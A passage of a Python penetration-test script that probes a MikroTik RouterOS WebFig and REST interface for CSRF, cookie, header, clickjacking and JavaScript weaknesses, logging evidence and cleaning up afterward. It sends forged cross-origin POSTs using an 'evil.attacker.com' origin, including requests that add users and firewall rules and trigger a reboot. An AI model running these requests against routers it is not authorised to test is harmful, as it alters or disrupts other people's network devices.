#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — WebFig Session & Client-Side Security
Phase 2, Script: attack_webfig_session.py
Target: [REDACTED-INTERNAL-IP]

Tests (~200):
  1. CSRF Testing (~50)               — Token checks, cross-origin POSTs, Referer/Origin validation
  2. Cookie/Session Security (~30)     — HttpOnly, Secure, SameSite, Path, Expires
  3. Security Headers (~30)            — CSP, X-Frame-Options, HSTS, Cache-Control, etc.
  4. Clickjacking (~15)                — Frame embedding, frame-ancestors, X-Frame-Options per page
  5. JavaScript Security Analysis (~40)— eval(), innerHTML, hardcoded creds, DOM XSS sinks
  6. Cache Poisoning (~20)             — Host header, X-Forwarded-Host, Vary/ETag behavior
  7. HTTP Response Splitting / CRLF (~15) — CRLF in URL, query params, headers

Evidence: evidence/webfig_session.json
"""

import json
import re
import socket
import ssl
import sys
import time
import warnings

import requests
import urllib3

# Suppress all SSL / InsecureRequestWarning noise
warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import (
    EvidenceCollector, rest_get, rest_post, pull_router_logs,
    check_router_alive, TARGET, ADMIN_USER, ADMIN_PASS, USERS, log,
)

# ── Globals ──────────────────────────────────────────────────────────────────

HTTP_BASE  = f"http://{TARGET}"
HTTPS_BASE = f"https://{TARGET}"
AUTH = (ADMIN_USER, ADMIN_PASS)
TIMEOUT = 10

ec = EvidenceCollector("attack_webfig_session.py", phase=2)


# ── Helpers ──────────────────────────────────────────────────────────────────

def http_get(url, auth=None, headers=None, allow_redirects=True, timeout=TIMEOUT):
    """Perform an HTTP GET, return the full Response object or None."""
    try:
        return requests.get(
            url, auth=auth, headers=headers or {},
            allow_redirects=allow_redirects,
            timeout=timeout, verify=False)
    except Exception as e:
        return None


def http_post(url, auth=None, headers=None, data=None, json_data=None,
              allow_redirects=True, timeout=TIMEOUT):
    """Perform an HTTP POST, return the full Response object or None."""
    try:
        return requests.post(
            url, auth=auth, headers=headers or {},
            data=data, json=json_data,
            allow_redirects=allow_redirects,
            timeout=timeout, verify=False)
    except Exception as e:
        return None


def raw_http(host, port, raw_request, timeout=5):
    """Send a raw HTTP request and return raw response bytes."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.sendall(raw_request.encode() if isinstance(raw_request, str) else raw_request)
        chunks = []
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            except socket.timeout:
                break
        s.close()
        return b"".join(chunks)
    except Exception as e:
        return None


# ═════════════════════════════════════════════════════════════════════════════
# 1. CSRF TESTING (~50 tests)
# ═════════════════════════════════════════════════════════════════════════════

def test_csrf():
    log("=" * 60)
    log("SECTION 1: CSRF Testing")
    log("=" * 60)

    csrf_finding_recorded = False

    # 1a. Check if REST API uses CSRF tokens at all ────────────────────────
    # Try a normal authenticated POST and inspect request/response for CSRF tokens
    test_endpoints = [
        "/rest/system/identity",
        "/rest/ip/address",
        "/rest/user",
        "/rest/ip/firewall/filter",
        "/rest/system/scheduler",
    ]

    has_csrf_token = False
    for ep in test_endpoints:
        r = http_get(f"{HTTP_BASE}{ep}", auth=AUTH)
        if r is not None:
            # Check response headers and body for CSRF token indicators
            resp_text = r.text if r.text else ""
            resp_headers = dict(r.headers)
            token_found = False
            for indicator in ["csrf", "xsrf", "_token", "X-CSRF", "X-XSRF"]:
                if indicator.lower() in resp_text.lower():
                    token_found = True
                if any(indicator.lower() in h.lower() for h in resp_headers):
                    token_found = True
            for cookie in r.cookies:
                if any(ind.lower() in cookie.name.lower() for ind in ["csrf", "xsrf"]):
                    token_found = True

            if token_found:
                has_csrf_token = True

            ec.add_test("csrf", f"csrf_token_check_{ep.split('/')[-1]}",
                         f"Check for CSRF token on {ep}",
                         "CSRF token found" if token_found else "No CSRF token",
                         details={"endpoint": ep, "token_found": token_found,
                                  "response_headers": resp_headers},
                         anomaly=not token_found)
        else:
            ec.add_test("csrf", f"csrf_token_check_{ep.split('/')[-1]}",
                         f"Check for CSRF token on {ep}",
                         "Connection failed", anomaly=False)

    if not has_csrf_token:
        ec.add_finding("MEDIUM", "No CSRF protection on REST API",
                        "The MikroTik REST API does not use CSRF tokens for "
                        "state-changing operations. Since it uses HTTP Basic Auth, "
                        "browsers automatically attach credentials on cross-origin "
                        "requests unless CORS is restrictive.",
                        cwe="CWE-352",
                        evidence_refs=["csrf_token_check_*"])
        csrf_finding_recorded = True

    # 1b. State-changing operations via cross-origin POST ──────────────────
    state_changing_ops = [
        ("/rest/ip/address/add", {"address": "[REDACTED-INTERNAL-IP]/32", "interface": "lo"}, "Add IP address"),
        ("/rest/user/add", {"name": "csrftest", "password": "csrftest123", "group": "read"}, "Add user"),
        ("/rest/system/identity/set", {"name": "MikroTik"}, "Set system identity"),
        ("/rest/ip/firewall/filter/add", {"chain": "input", "action": "accept", "comment": "csrf-test"}, "Add firewall rule"),
        ("/rest/system/scheduler/add", {"name": "csrftest", "interval": "1d", "on-event": "/log info csrf"}, "Add scheduler"),
        ("/rest/system/script/add", {"name": "csrftest", "source": ":log info csrf"}, "Add script"),
        ("/rest/tool/fetch", {"url": "http://127.0.0.1", "mode": "http"}, "Fetch URL"),
        ("/rest/ip/service/set", {".id": "www", "disabled": "false"}, "Set service"),
        ("/rest/snmp/set", {"enabled": "true"}, "Set SNMP"),
        ("/rest/ip/dns/set", {"servers": "[REDACTED-IP]"}, "Set DNS"),
        ("/rest/interface/set", {".id": "lo", "comment": "csrf-test"}, "Set interface"),
        ("/rest/ip/route/add", {"dst-address": "[REDACTED-INTERNAL-IP]/24", "gateway": "[REDACTED-INTERNAL-IP]"}, "Add route"),
        ("/rest/certificate/add", {"name": "csrftest", "common-name": "csrftest"}, "Add certificate"),
    ]

    # Dangerous ops tested separately with safe payloads
    dangerous_ops = [
        ("/rest/system/reboot", {}, "Reboot system"),
        ("/rest/file/remove", {".id": "nonexistent"}, "Remove file"),
    ]

    all_ops = state_changing_ops + dangerous_ops

    for path, payload, desc in all_ops:
        op_name = path.replace("/rest/", "").replace("/", "_")

        # Test 1: Cross-origin Referer
        cross_origin_headers = {
            "Referer": "http://evil.attacker.com/csrf.html",
            "Origin": "http://evil.attacker.com",
            "Content-Type": "application/json",
        }
        r = http_post(f"{HTTP_BASE}{path}", auth=AUTH,
                       headers=cross_origin_headers, json_data=payload)

        if r is not None:
            # Did the server reject based on Referer/Origin?
            rejected = r.status_code in (403, 401, 400) and (
                "origin" in r.text.lower() or "referer" in r.text.lower() or
                "csrf" in r.text.lower()
            )
            ec.add_test("csrf", f"cross_origin_post_{op_name}",
                         f"Cross-origin POST to {path} with evil Referer/Origin",
                         f"HTTP {r.status_code} - {'REJECTED (good)' if rejected else 'ACCEPTED (no origin check)'}",
                         details={"path": path, "status": r.status_code,
                                  "response_snippet": r.text[:300],
                                  "cross_origin_rejected": rejected},
                         anomaly=not rejected)
        else:
            ec.add_test("csrf", f"cross_origin_post_{op_name}",
                         f"Cross-origin POST to {path}",
                         "Connection failed", anomaly=False)

        # Test 2: No CSRF token (just normal auth, no token)
        r2 = http_post(f"{HTTP_BASE}{path}", auth=AUTH,
                        headers={"Content-Type": "application/json"},
                        json_data=payload)
        if r2 is not None:
            # If it succeeds without any CSRF token, that's an issue
            accepted = r2.status_code in (200, 201)
            ec.add_test("csrf", f"no_csrf_token_{op_name}",
                         f"POST to {path} with no CSRF token",
                         f"HTTP {r2.status_code} - {'ACCEPTED' if accepted else 'REJECTED'}",
                         details={"path": path, "status": r2.status_code,
                                  "response_snippet": r2.text[:300]},
                         anomaly=accepted)
        else:
            ec.add_test("csrf", f"no_csrf_token_{op_name}",
                         f"POST to {path} with no CSRF token",
                         "Connection failed", anomaly=False)

    # 1c. GET for state-changing operations (should not be allowed) ────────
    get_write_ops = [
        "/rest/system/identity/set?.proplist=name&name=MikroTik",
        "/rest/ip/dns/set?.proplist=servers&servers=[REDACTED-IP]",
        "/rest/snmp/set?.proplist=enabled&enabled=true",
    ]

    for url_path in get_write_ops:
        op_name = url_path.split("?")[0].replace("/rest/", "").replace("/", "_")
        r = http_get(f"{HTTP_BASE}{url_path}", auth=AUTH)
        if r is not None:
            # If GET returns 200 for a write op, it might have succeeded
            ec.add_test("csrf", f"get_for_write_{op_name}",
                         f"GET request to state-changing endpoint {url_path.split('?')[0]}",
                         f"HTTP {r.status_code}",
                         details={"url": url_path, "status": r.status_code,
                                  "response_snippet": r.text[:300]},
                         anomaly=(r.status_code == 200))
        else:
            ec.add_test("csrf", f"get_for_write_{op_name}",
                         f"GET for write to {url_path.split('?')[0]}",
                         "Connection failed", anomaly=False)

    # 1d. Test with wrong / random CSRF token ──────────────────────────────
    wrong_token_ops = [
        ("/rest/system/identity/set", {"name": "MikroTik"}),
        ("/rest/ip/dns/set", {"servers": "[REDACTED-IP]"}),
        ("/rest/snmp/set", {"enabled": "true"}),
    ]
    for path, payload in wrong_token_ops:
        op_name = path.replace("/rest/", "").replace("/", "_")
        headers = {
            "Content-Type": "application/json",
            "X-CSRF-Token": "INVALID_TOKEN_12345",
            "X-XSRF-TOKEN": "INVALID_TOKEN_12345",
        }
        r = http_post(f"{HTTP_BASE}{path}", auth=AUTH,
                       headers=headers, json_data=payload)
        if r is not None:
            accepted = r.status_code in (200, 201)
            ec.add_test("csrf", f"wrong_csrf_token_{op_name}",
                         f"POST to {path} with invalid CSRF token",
                         f"HTTP {r.status_code} - {'ACCEPTED despite wrong token' if accepted else 'REJECTED'}",
                         details={"path": path, "status": r.status_code,
                                  "response_snippet": r.text[:300]},
                         anomaly=accepted)
        else:
            ec.add_test("csrf", f"wrong_csrf_token_{op_name}",
                         f"POST to {path} with invalid CSRF token",
                         "Connection failed", anomaly=False)

    # Cleanup: remove any test objects we created
    _csrf_cleanup()


def _csrf_cleanup():
    """Remove test artifacts created during CSRF testing."""
    log("  Cleaning up CSRF test artifacts...")

    # Remove test user
    status, data = rest_get("/user")
    if status == 200 and isinstance(data, list):
        for u in data:
            if u.get("name") == "csrftest":
                rest_post("/user/remove", {".id": u[".id"]})
                log("    Removed csrftest user")

    # Remove test firewall rule
    status, data = rest_get("/ip/firewall/filter")
    if status == 200 and isinstance(data, list):
        for rule in data:
            if rule.get("comment") == "csrf-test":
                rest_post("/ip/firewall/filter/remove", {".id": rule[".id"]})
                log("    Removed csrf-test firewall rule")

    # Remove test scheduler
    status, data = rest_get("/system/scheduler")
    if status == 200 and isinstance(data, list):
        for sched in data:
            if sched.get("name") == "csrftest":
                rest_post("/system/scheduler/remove", {".id": sched[".id"]})
                log("    Removed csrftest scheduler")

    # Remove test script
    status, data = rest_get("/system/script")
    if status == 200 and isinstance(data, list):
        for script in data:
            if script.get("name") == "csrftest":
                rest_post("/system/script/remove", {".id": script[".id"]})
                log("    Removed csrftest script")

    # Remove test IP address
    status, data = rest_get("/ip/address")
    if status == 200 and isinstance(data, list):
        for addr in data:
            if addr.get("address", "").startswith("[REDACTED-INTERNAL-IP]"):
                rest_post("/ip/address/remove", {".id": addr[".id"]})
                log("    Removed [REDACTED-INTERNAL-IP] address")

    # Remove test route
    status, data = rest_get("/ip/route")
    if status == 200 and isinstance(data, list):
        for route in data:
            if route.get("dst-address") == "[REDACTED-INTERNAL-IP]/24":
                rest_post("/ip/route/remove", {".id": route[".id"]})
                log("    Removed test route")

    # Remove test certificate
    status, data = rest_get("/certificate")
    if status == 200 and isinstance(data, list):
        for cert in data:
            if cert.get("name", "").startswith("csrftest"):
                rest_post("/certificate/remove", {".id": cert[".id"]})
                log("    Removed csrftest certificate")

    # Remove test interface comment
    status, data = rest_get("/interface")
    if status == 200 and isinstance(data, list):
        for iface in data:
            if iface.get("name") == "lo" and iface.get("comment") == "csrf-test":
                rest_post("/interface/set", {".id": iface[".id"], "comment": ""})
                log("    Cleared csrf-test comment on lo")


# ═════════════════════════════════════════════════════════════════════════════
# 2. COOKIE / SESSION SECURITY (~30 tests)
# ═════════════════════════════════════════════════════════════════════════════

def test_cookie_session():
    log("=" * 60)
    log("SECTION 2: Cookie / Session Security")
    log("=" * 60)

    cookie_issues = []

    # 2a. Extract cookies from WebFig login ────────────────────────────────
    endpoints_to_check = [
        (f"{HTTP_BASE}/webfig/", "WebFig main (HTTP)"),
        (f"{HTTP_BASE}/rest/system/resource", "REST API (HTTP)"),
        (f"{HTTPS_BASE}/webfig/", "WebFig main (HTTPS)"),
        (f"{HTTPS_BASE}/rest/system/resource", "REST API (HTTPS)"),
    ]

    all_cookies = {}  # endpoint -> [cookie details]

    for url, label in endpoints_to_check:
        r = http_get(url, auth=AUTH)
        if r is None:
            ec.add_test("cookie_session", f"cookie_extract_{label.replace(' ', '_').lower()}",
                         f"Extract cookies from {label}",
                         "Connection failed", anomaly=False)
            continue

        set_cookie_headers = r.headers.get("Set-Cookie", "")
        cookies_found = []

        # Parse Set-Cookie from raw headers (requests merges them)
        raw_headers = r.raw._original_response.msg if hasattr(r.raw, '_original_response') else {}
        set_cookie_values = []
        if hasattr(raw_headers, 'get_all'):
            set_cookie_values = raw_headers.get_all("Set-Cookie") or []
        elif set_cookie_headers:
            set_cookie_values = [set_cookie_headers]

        # Also check response cookies
        for cookie in r.cookies:
            cookie_info = {
                "name": cookie.name,
                "value_length": len(str(cookie.value)),
                "domain": cookie.domain,
                "path": cookie.path,
                "secure": cookie.secure,
                "httponly": cookie.has_nonstandard_attr("httponly") or cookie.has_nonstandard_attr("HttpOnly"),
                "expires": str(cookie.expires) if cookie.expires else None,
            }
            cookies_found.append(cookie_info)

        all_cookies[label] = {
            "cookies": cookies_found,
            "set_cookie_raw": set_cookie_values,
            "status_code": r.status_code,
        }

        ec.add_test("cookie_session", f"cookie_extract_{label.replace(' ', '_').lower()}",
                     f"Extract cookies from {label}",
                     f"{len(cookies_found)} cookies found",
                     details=all_cookies[label])

    # 2b. Analyze each cookie's security attributes ────────────────────────
    for label, cookie_data in all_cookies.items():
        for raw_cookie_str in cookie_data.get("set_cookie_raw", []):
            cookie_lower = raw_cookie_str.lower() if raw_cookie_str else ""
            cookie_name = raw_cookie_str.split("=")[0].strip() if raw_cookie_str else "unknown"

            # HttpOnly check
            has_httponly = "httponly" in cookie_lower
            ec.add_test("cookie_session", f"httponly_{label.replace(' ', '_').lower()}_{cookie_name}",
                         f"HttpOnly flag on '{cookie_name}' ({label})",
                         "Present" if has_httponly else "MISSING",
                         details={"cookie": cookie_name, "raw": raw_cookie_str[:200]},
                         anomaly=not has_httponly)
            if not has_httponly:
                cookie_issues.append(f"Missing HttpOnly on {cookie_name} ({label})")

            # Secure flag check
            has_secure = "secure" in cookie_lower.replace("samesite", "")
            # Only flag as issue for HTTPS responses (Secure flag only makes sense there)
            is_https = "HTTPS" in label
            ec.add_test("cookie_session", f"secure_flag_{label.replace(' ', '_').lower()}_{cookie_name}",
                         f"Secure flag on '{cookie_name}' ({label})",
                         "Present" if has_secure else "MISSING",
                         details={"cookie": cookie_name, "is_https": is_https},
                         anomaly=not has_secure)
            if not has_secure:
                cookie_issues.append(f"Missing Secure flag on {cookie_name} ({label})")

            # SameSite attribute check
            has_samesite = "samesite" in cookie_lower
            samesite_value = None
            if has_samesite:
                match = re.search(r'samesite\s*=\s*(strict|lax|none)', cookie_lower)
                samesite_value = match.group(1) if match else "unknown"
            ec.add_test("cookie_session", f"samesite_{label.replace(' ', '_').lower()}_{cookie_name}",
                         f"SameSite attribute on '{cookie_name}' ({label})",
                         f"SameSite={samesite_value}" if has_samesite else "MISSING",
                         details={"cookie": cookie_name, "samesite_value": samesite_value},
                         anomaly=not has_samesite)
            if not has_samesite:
                cookie_issues.append(f"Missing SameSite on {cookie_name} ({label})")

            # Path scope check
            path_match = re.search(r'path\s*=\s*([^;]+)', cookie_lower)
            path_value = path_match.group(1).strip() if path_match else "not set"
            ec.add_test("cookie_session", f"path_scope_{label.replace(' ', '_').lower()}_{cookie_name}",
                         f"Path scope on '{cookie_name}' ({label})",
                         f"Path={path_value}",
                         details={"cookie": cookie_name, "path": path_value})

            # Expires / Max-Age check
            has_expires = "expires=" in cookie_lower or "max-age=" in cookie_lower
            ec.add_test("cookie_session", f"expiry_{label.replace(' ', '_').lower()}_{cookie_name}",
                         f"Expires/Max-Age on '{cookie_name}' ({label})",
                         "Set" if has_expires else "Session cookie (no explicit expiry)",
                         details={"cookie": cookie_name})

    # 2c. Session transmitted over HTTP (should only be HTTPS) ─────────────
    r_http = http_get(f"{HTTP_BASE}/webfig/", auth=AUTH)
    if r_http is not None and r_http.cookies:
        session_over_http = True
        cookie_names = [c.name for c in r_http.cookies]
        ec.add_test("cookie_session", "session_over_http",
                     "Session cookies transmitted over unencrypted HTTP",
                     f"COOKIES SENT OVER HTTP: {cookie_names}",
                     details={"cookie_names": cookie_names},
                     anomaly=True)
        cookie_issues.append("Session cookies transmitted over HTTP")
    else:
        ec.add_test("cookie_session", "session_over_http",
                     "Session cookies transmitted over unencrypted HTTP",
                     "No cookies set over HTTP" if r_http is not None else "HTTP unavailable",
                     anomaly=False)

    # 2d. Check for session ID in URL parameters ──────────────────────────
    r = http_get(f"{HTTP_BASE}/webfig/", auth=AUTH, allow_redirects=False)
    if r is not None:
        location = r.headers.get("Location", "")
        url_has_session = any(kw in location.lower() for kw in
                              ["session", "sid", "jsessionid", "phpsessid", "token"])
        # Also check the response URL itself after redirects
        r2 = http_get(f"{HTTP_BASE}/webfig/", auth=AUTH, allow_redirects=True)
        final_url = r2.url if r2 else ""
        url_has_session = url_has_session or any(
            kw in final_url.lower() for kw in ["session", "sid", "token="])

        ec.add_test("cookie_session", "session_in_url",
                     "Check for session ID in URL parameters",
                     "Session in URL detected" if url_has_session else "No session in URL",
                     details={"location_header": location, "final_url": final_url},
                     anomaly=url_has_session)
    else:
        ec.add_test("cookie_session", "session_in_url",
                     "Check for session ID in URL parameters",
                     "Connection failed", anomaly=False)

    # 2e. Cookie behavior comparison: HTTP vs HTTPS ────────────────────────
    http_cookies = set()
    https_cookies = set()
    r_http = http_get(f"{HTTP_BASE}/webfig/", auth=AUTH)
    r_https = http_get(f"{HTTPS_BASE}/webfig/", auth=AUTH)
    if r_http is not None:
        http_cookies = {c.name for c in r_http.cookies}
    if r_https is not None:
        https_cookies = {c.name for c in r_https.cookies}

    ec.add_test("cookie_session", "http_vs_https_cookies",
                 "Compare cookies set over HTTP vs HTTPS",
                 f"HTTP: {http_cookies or 'none'}, HTTPS: {https_cookies or 'none'}",
                 details={"http_cookies": list(http_cookies),
                          "https_cookies": list(https_cookies)})

    # Record finding if there are cookie issues
    if cookie_issues:
        ec.add_finding("MEDIUM", "Insecure cookie attributes",
                        f"Multiple cookie security attribute issues detected: "
                        f"{'; '.join(cookie_issues[:5])}{'...' if len(cookie_issues) > 5 else ''}",
                        cwe="CWE-614",
                        evidence_refs=["httponly_*", "secure_flag_*", "samesite_*"])


# ═════════════════════════════════════════════════════════════════════════════
# 3. SECURITY HEADERS (~30 tests)
# ═════════════════════════════════════════════════════════════════════════════

def test_security_headers():
    log("=" * 60)
    log("SECTION 3: Security Headers")
    log("=" * 60)

    expected_headers = {
        "Content-Security-Policy":            ("CSP", "missing"),
        "X-Frame-Options":                    ("Clickjacking protection", "missing"),
        "X-Content-Type-Options":             ("MIME sniffing protection", "nosniff"),
        "Strict-Transport-Security":          ("HSTS", "missing"),
        "X-XSS-Protection":                   ("XSS filter", "missing"),
        "Referrer-Policy":                    ("Referrer leak prevention", "missing"),
        "Permissions-Policy":                 ("Feature restrictions", "missing"),
        "Cache-Control":                      ("Cache directive", "missing"),
        "X-Permitted-Cross-Domain-Policies":  ("Flash/Acrobat cross-domain", "missing"),
    }

    check_endpoints = [
        (f"{HTTP_BASE}/", "HTTP root"),
        (f"{HTTP_BASE}/webfig/", "WebFig (HTTP)"),
        (f"{HTTP_BASE}/rest/system/resource", "REST API (HTTP)"),
        (f"{HTTPS_BASE}/webfig/", "WebFig (HTTPS)"),
        (f"{HTTPS_BASE}/rest/system/resource", "REST API (HTTPS)"),
    ]

    # Try jsproxy too
    r_jsproxy = http_get(f"{HTTP_BASE}/jsproxy/", auth=AUTH)
    if r_jsproxy is not None and r_jsproxy.status_code != 404:
        check_endpoints.append((f"{HTTP_BASE}/jsproxy/", "jsproxy (HTTP)"))

    missing_headers_per_endpoint = {}

    for url, label in check_endpoints:
        needs_auth = "rest/" in url
        r = http_get(url, auth=AUTH if needs_auth else None)
        if r is None:
            ec.add_test("security_headers", f"headers_{label.replace(' ', '_').lower()}",
                         f"Fetch headers from {label}",
                         "Connection failed", anomaly=False)
            continue

        resp_headers = {k.lower(): v for k, v in r.headers.items()}
        missing = []

        for header_name, (purpose, expected_val) in expected_headers.items():
            present = header_name.lower() in resp_headers
            actual_val = resp_headers.get(header_name.lower(), "NOT PRESENT")

            is_anomaly = not present
            # Cache-Control: anomaly only for authenticated endpoints
            if header_name == "Cache-Control" and not needs_auth:
                is_anomaly = False
            # HSTS: only relevant for HTTPS
            if header_name == "Strict-Transport-Security" and "HTTPS" not in label:
                is_anomaly = False

            ec.add_test("security_headers",
                         f"hdr_{header_name.lower().replace('-', '_')}_{label.replace(' ', '_').lower()}",
                         f"{header_name} on {label} ({purpose})",
                         actual_val if present else "NOT PRESENT",
                         details={"header": header_name, "value": actual_val,
                                  "endpoint": url, "expected": expected_val},
                         anomaly=is_anomaly)

            if not present:
                missing.append(header_name)

        missing_headers_per_endpoint[label] = missing

    # Summarize findings
    # Check if any critical headers are universally missing
    universal_missing = set()
    if missing_headers_per_endpoint:
        universal_missing = set(missing_headers_per_endpoint[list(missing_headers_per_endpoint.keys())[0]])
        for ep, missing_list in missing_headers_per_endpoint.items():
            universal_missing &= set(missing_list)

    critical_missing = universal_missing & {
        "Content-Security-Policy", "X-Frame-Options",
        "X-Content-Type-Options", "Strict-Transport-Security",
    }

    if critical_missing:
        ec.add_finding("MEDIUM", "Missing critical security headers",
                        f"The following security headers are missing across all "
                        f"checked endpoints: {', '.join(sorted(critical_missing))}. "
                        f"This leaves the web interface vulnerable to clickjacking, "
                        f"MIME sniffing, and other client-side attacks.",
                        cwe="CWE-693",
                        evidence_refs=["hdr_*"])

    # Special: check HSTS on HTTPS endpoints
    for url, label in check_endpoints:
        if "HTTPS" in label:
            r = http_get(url, auth=AUTH if "rest/" in url else None)
            if r is not None:
                hsts = r.headers.get("Strict-Transport-Security")
                if hsts:
                    # Check for max-age, includeSubDomains
                    max_age_match = re.search(r'max-age=(\d+)', hsts)
                    max_age = int(max_age_match.group(1)) if max_age_match else 0
                    ec.add_test("security_headers", f"hsts_strength_{label.replace(' ', '_').lower()}",
                                 f"HSTS max-age value on {label}",
                                 f"max-age={max_age}" + (
                                     " (weak: <1 year)" if max_age < 31536000 else " (adequate)"),
                                 details={"hsts_header": hsts, "max_age": max_age},
                                 anomaly=(max_age < 31536000))


# ═════════════════════════════════════════════════════════════════════════════
# 4. CLICKJACKING (~15 tests)
# ═════════════════════════════════════════════════════════════════════════════

def test_clickjacking():
    log("=" * 60)
    log("SECTION 4: Clickjacking")
    log("=" * 60)

    clickjack_pages = [
        (f"{HTTP_BASE}/", "Root page (HTTP)"),
        (f"{HTTP_BASE}/webfig/", "WebFig main (HTTP)"),
        (f"{HTTPS_BASE}/webfig/", "WebFig main (HTTPS)"),
        (f"{HTTP_BASE}/webfig/#!login", "WebFig login (HTTP)"),
        (f"{HTTP_BASE}/rest/system/resource", "REST endpoint (HTTP)"),
        (f"{HTTPS_BASE}/rest/system/resource", "REST endpoint (HTTPS)"),
    ]

    frameable_pages = []

    for url, label in clickjack_pages:
        needs_auth = "rest/" in url
        r = http_get(url, auth=AUTH if needs_auth else None)
        if r is None:
            ec.add_test("clickjacking", f"xfo_{label.replace(' ', '_').lower()}",
                         f"X-Frame-Options on {label}",
                         "Connection failed", anomaly=False)
            continue

        xfo = r.headers.get("X-Frame-Options", "")
        csp = r.headers.get("Content-Security-Policy", "")
        frame_ancestors = ""
        if "frame-ancestors" in csp.lower():
            match = re.search(r"frame-ancestors\s+([^;]+)", csp, re.IGNORECASE)
            frame_ancestors = match.group(1).strip() if match else ""

        frameable = not xfo and not frame_ancestors
        if frameable:
            frameable_pages.append(label)

        ec.add_test("clickjacking", f"xfo_{label.replace(' ', '_').lower()}",
                     f"X-Frame-Options on {label}",
                     xfo if xfo else "NOT SET",
                     details={"x_frame_options": xfo, "csp_frame_ancestors": frame_ancestors,
                              "frameable": frameable},
                     anomaly=frameable)

        if frame_ancestors:
            ec.add_test("clickjacking", f"frame_ancestors_{label.replace(' ', '_').lower()}",
                         f"CSP frame-ancestors on {label}",
                         f"frame-ancestors {frame_ancestors}",
                         details={"value": frame_ancestors})
        else:
            ec.add_test("clickjacking", f"frame_ancestors_{label.replace(' ', '_').lower()}",
                         f"CSP frame-ancestors on {label}",
                         "NOT SET",
                         anomaly=frameable)

    # Test: construct iframe embedding test
    # We just check if X-Frame-Options blocks it; we can't render a browser
    # but we can check server-side protection
    ec.add_test("clickjacking", "iframe_embedding_assessment",
                 "Overall iframe embedding assessment based on header analysis",
                 f"{len(frameable_pages)} pages lack framing protection: "
                 f"{', '.join(frameable_pages) if frameable_pages else 'none'}",
                 details={"frameable_pages": frameable_pages,
                          "total_checked": len(clickjack_pages)},
                 anomaly=len(frameable_pages) > 0)

    if frameable_pages:
        ec.add_finding("LOW", "WebFig vulnerable to clickjacking",
                        f"The following pages can be embedded in iframes due to "
                        f"missing X-Frame-Options and CSP frame-ancestors: "
                        f"{', '.join(frameable_pages)}. An attacker could overlay "
                        f"the WebFig interface with invisible elements to trick "
                        f"administrators into performing unintended actions.",
                        cwe="CWE-1021",
                        evidence_refs=["xfo_*", "frame_ancestors_*"])


# ═════════════════════════════════════════════════════════════════════════════
# 5. JAVASCRIPT SECURITY ANALYSIS (~40 tests)
# ═════════════════════════════════════════════════════════════════════════════

def test_javascript_security():
    log("=" * 60)
    log("SECTION 5: JavaScript Security Analysis")
    log("=" * 60)

    # 5a. Fetch the main WebFig page and extract JS file references ────────
    r = http_get(f"{HTTP_BASE}/webfig/", auth=AUTH)
    if r is None:
        ec.add_test("js_security", "fetch_webfig_page",
                     "Fetch WebFig main page", "Connection failed", anomaly=False)
        return

    page_html = r.text
    ec.add_test("js_security", "fetch_webfig_page",
                 "Fetch WebFig main page",
                 f"HTTP {r.status_code}, {len(page_html)} bytes",
                 details={"status": r.status_code, "size": len(page_html)})

    # Extract JS file paths
    js_files = set()
    for match in re.findall(r'(?:src|href)\s*=\s*["\']([^"\']*\.js(?:\?[^"\']*)?)["\']', page_html):
        js_files.add(match)
    # Also check for inline script blocks
    inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', page_html, re.DOTALL)

    ec.add_test("js_security", "js_file_enum",
                 "Enumerate JavaScript files referenced by WebFig",
                 f"{len(js_files)} external JS files, {len(inline_scripts)} inline scripts",
                 details={"js_files": list(js_files),
                          "inline_script_count": len(inline_scripts),
                          "inline_script_sizes": [len(s) for s in inline_scripts]})

    # 5b. Fetch and analyze each JS file ───────────────────────────────────
    all_js_content = ""
    js_file_details = {}

    for js_path in js_files:
        # Normalize path
        if js_path.startswith("//"):
            js_url = f"http:{js_path}"
        elif js_path.startswith("/"):
            js_url = f"{HTTP_BASE}{js_path}"
        elif js_path.startswith("http"):
            js_url = js_path
        else:
            js_url = f"{HTTP_BASE}/webfig/{js_path}"

        r_js = http_get(js_url, auth=AUTH)
        if r_js is not None and r_js.status_code == 200:
            js_content = r_js.text
            all_js_content += js_content + "\n"
            content_type = r_js.headers.get("Content-Type", "")
            js_file_details[js_path] = {
                "size": len(js_content),
                "content_type": content_type,
                "status": r_js.status_code,
            }

            # Check Content-Type for JS files
            is_proper_ct = "javascript" in content_type.lower() or "application/json" in content_type.lower()
            ec.add_test("js_security", f"js_content_type_{js_path.split('/')[-1].split('?')[0][:30]}",
                         f"Content-Type for {js_path}",
                         content_type,
                         details={"file": js_path, "content_type": content_type},
                         anomaly=(not is_proper_ct and "text/html" in content_type.lower()))
        else:
            js_file_details[js_path] = {"error": "fetch failed"}

    # Add inline scripts too
    for script in inline_scripts:
        all_js_content += script + "\n"

    if not all_js_content:
        ec.add_test("js_security", "js_content_available",
                     "JavaScript content available for analysis",
                     "No JS content fetched", anomaly=True)
        return

    # 5c. Dangerous function patterns ──────────────────────────────────────
    dangerous_patterns = {
        "eval()": r'\beval\s*\(',
        "innerHTML": r'\.innerHTML\s*=',
        "document.write()": r'document\.write\s*\(',
        "setTimeout_string": r'setTimeout\s*\(\s*["\']',
        "setInterval_string": r'setInterval\s*\(\s*["\']',
        "Function_constructor": r'new\s+Function\s*\(',
        "outerHTML": r'\.outerHTML\s*=',
        "insertAdjacentHTML": r'\.insertAdjacentHTML\s*\(',
    }

    for pattern_name, regex in dangerous_patterns.items():
        matches = re.findall(regex, all_js_content)
        count = len(matches)
        # Get context around matches
        contexts = []
        for m in re.finditer(regex, all_js_content):
            start = max(0, m.start() - 40)
            end = min(len(all_js_content), m.end() + 40)
            contexts.append(all_js_content[start:end].replace("\n", " ").strip())
        contexts = contexts[:5]  # Limit to first 5

        ec.add_test("js_security", f"dangerous_{pattern_name.lower()}",
                     f"Search for {pattern_name} in JavaScript",
                     f"{count} occurrences found",
                     details={"count": count, "sample_contexts": contexts},
                     anomaly=(count > 0))

    # 5d. Hardcoded credentials / secrets ──────────────────────────────────
    secret_patterns = {
        "hardcoded_password": r'(?:password|passwd|pwd)\s*[:=]\s*["\'][^"\']{3,}["\']',
        "hardcoded_api_key": r'(?:api[_-]?key|apikey|api_secret)\s*[:=]\s*["\'][^"\']{8,}["\']',
